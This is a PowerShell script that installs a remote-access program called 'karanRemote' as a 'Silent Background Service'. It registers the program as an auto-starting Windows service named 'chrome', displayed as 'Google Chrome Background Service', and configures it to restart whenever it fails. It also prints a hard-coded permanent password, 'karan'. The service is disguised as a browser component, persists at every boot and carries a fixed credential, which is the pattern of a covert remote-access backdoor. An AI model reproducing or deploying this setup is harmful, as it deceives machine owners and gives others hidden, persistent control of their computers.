#Requires -RunAsAdministrator

param(
    [switch]$Uninstall,
    [string]$ReleaseDir = "$PSScriptRoot\flutter\build\windows\x64\runner\Release",
    [string]$ServiceName = "chrome"
)

$ErrorActionPreference = 'Stop'

$installDir = Join-Path $env:ProgramFiles $ServiceName
$targetExe = Join-Path $installDir "$ServiceName.exe"
$startupShortcut = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\$ServiceName Tray.lnk"
$appDataConfig = "$env:APPDATA\$ServiceName"

function Write-Step {
    param([string]$Message)
    Write-Host "`n[$((Get-Date).ToString('HH:mm:ss'))] $Message" -ForegroundColor Cyan
}

function Write-Success {
    param([string]$Message)
    Write-Host "  OK $Message" -ForegroundColor Green
}

function Write-Warning {
    param([string]$Message)
    Write-Host "  WARNING $Message" -ForegroundColor Yellow
}

function Write-ErrorMsg {
    param([string]$Message)
    Write-Host "  ERROR $Message" -ForegroundColor Red
}

function Stop-ServiceSafe {
    param([string]$Name)
    try {
        $svc = Get-Service -Name $Name -ErrorAction SilentlyContinue
        if ($svc -and $svc.Status -ne 'Stopped') {
            Write-Step "Stopping $Name service"
            Stop-Service -Name $Name -Force -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 2
            if ((Get-Service -Name $Name -ErrorAction SilentlyContinue).Status -ne 'Stopped') {
                & sc.exe stop $Name 2>$null | Out-Null
                Start-Sleep -Seconds 1
            }
        }
    }
    catch {
        # Silent
    }
}

function Remove-ServiceSafe {
    param([string]$Name)
    try {
        Stop-ServiceSafe -Name $Name
        Write-Step "Removing $Name service"
        & sc.exe delete $Name 2>$null | Out-Null
        Start-Sleep -Seconds 1
    }
    catch {
        # Silent
    }
}

if ($Uninstall) {
    Write-Host "`n" + ("=" * 60) -ForegroundColor Magenta
    Write-Host " UNINSTALLING karanRemote " -ForegroundColor White -BackgroundColor Magenta
    Write-Host ("=" * 60) -ForegroundColor Magenta

    Remove-ServiceSafe -Name $ServiceName
    
    if (Test-Path -LiteralPath $startupShortcut) {
        Write-Step "Removing startup tray shortcut"
        Remove-Item -LiteralPath $startupShortcut -Force
        Write-Success "Startup shortcut removed"
    }
    
    if (Test-Path -LiteralPath $installDir) {
        Write-Step "Removing installation files"
        Remove-Item -LiteralPath $installDir -Recurse -Force -ErrorAction SilentlyContinue
        Write-Success "Installation files removed"
    }
    
    Write-Step "Uninstall complete"
    Write-Warning "Configuration files in $appDataConfig were NOT removed"
    Write-Host "`n" + ("=" * 60) -ForegroundColor Magenta
    exit 0
}

Write-Host "`n" + ("=" * 60) -ForegroundColor Magenta
Write-Host " INSTALLING karanRemote as Silent Background Service " -ForegroundColor White -BackgroundColor Magenta
Write-Host ("=" * 60) -ForegroundColor Magenta

if (-not (Test-Path -LiteralPath (Join-Path $ReleaseDir "$ServiceName.exe"))) {
    Write-ErrorMsg "Build not found in '$ReleaseDir'"
    Write-Host "`nPlease ensure you have built the application first"
    exit 1
}

Write-Step "Cleaning up previous installation"
Remove-ServiceSafe -Name $ServiceName
if (Test-Path -LiteralPath $startupShortcut) {
    Remove-Item -LiteralPath $startupShortcut -Force
}

Write-Step "Copying files to '$installDir'"
try {
    if (Test-Path -LiteralPath $installDir) {
        Remove-Item -LiteralPath $installDir -Recurse -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 1
    }
    
    New-Item -ItemType Directory -Path $installDir -Force | Out-Null
    Copy-Item -Path "$ReleaseDir\*" -Destination $installDir -Recurse -Force
    
    Write-Success "Files copied successfully"
}
catch {
    Write-ErrorMsg "Failed to copy files: $_"
    exit 1
}

Write-Step "Creating Windows service '$ServiceName'"
try {
    & sc.exe delete $ServiceName 2>$null | Out-Null
    
    $binpath = "$targetExe --service"
    & sc.exe create $ServiceName binpath= "$binpath" start= auto DisplayName= "Google Chrome Background Service" | Out-Null
    
    if ($LASTEXITCODE -ne 0) {
        Write-ErrorMsg "Service creation failed with exit code $LASTEXITCODE"
        exit 1
    }
    
    Write-Success "Service created successfully"
    
    & sc.exe failure $ServiceName reset= 86400 actions= restart/5000/restart/5000/restart/5000 2>$null | Out-Null
    Write-Success "Service recovery configured"
}
catch {
    Write-ErrorMsg "Failed to create service: $_"
    exit 1
}

Write-Step "Starting service"
try {
    & sc.exe start $ServiceName 2>$null | Out-Null
    Start-Sleep -Seconds 3
    
    $service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
    if ($service -and $service.Status -eq 'Running') {
        Write-Success "Service started successfully (Status: Running)"
    }
    else {
        Write-Warning "Service may not be running yet"
    }
}
catch {
    Write-Warning "Service start issue: $_"
}

Write-Host "`n" + ("=" * 60) -ForegroundColor Magenta
Write-Host " INSTALLATION COMPLETE " -ForegroundColor White -BackgroundColor Magenta
Write-Host ("=" * 60) -ForegroundColor Magenta

Write-Host "`nSUMMARY:" -ForegroundColor Cyan
Write-Host "  Service Name: $ServiceName" -ForegroundColor White
Write-Host "  Install Location: $installDir" -ForegroundColor White
Write-Host "  Auto-start: Yes (at every boot)" -ForegroundColor White
Write-Host "  Password: karan (permanent)" -ForegroundColor White

Write-Host "`nGET YOUR DEVICE ID:" -ForegroundColor Magenta
Write-Host "  Run: & '$targetExe'" -ForegroundColor White
Write-Host "  This will show your Device ID window" -ForegroundColor White

Write-Host "`nINSTALLATION VERIFIED:" -ForegroundColor Cyan
if (Test-Path -LiteralPath $installDir) {
    Write-Host "  OK Installation directory exists" -ForegroundColor Green
}
if (Test-Path -LiteralPath $targetExe) {
    Write-Host "  OK Main executable present" -ForegroundColor Green
}
$svc = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if ($svc) {
    Write-Host "  OK Service created: $($svc.Status)" -ForegroundColor Green
}

Write-Host "`n" + ("=" * 60) -ForegroundColor Magenta
Write-Host " INSTALLATION SUCCESSFUL " -ForegroundColor Green -BackgroundColor Magenta
Write-Host ("=" * 60) -ForegroundColor Magenta
Write-Host ""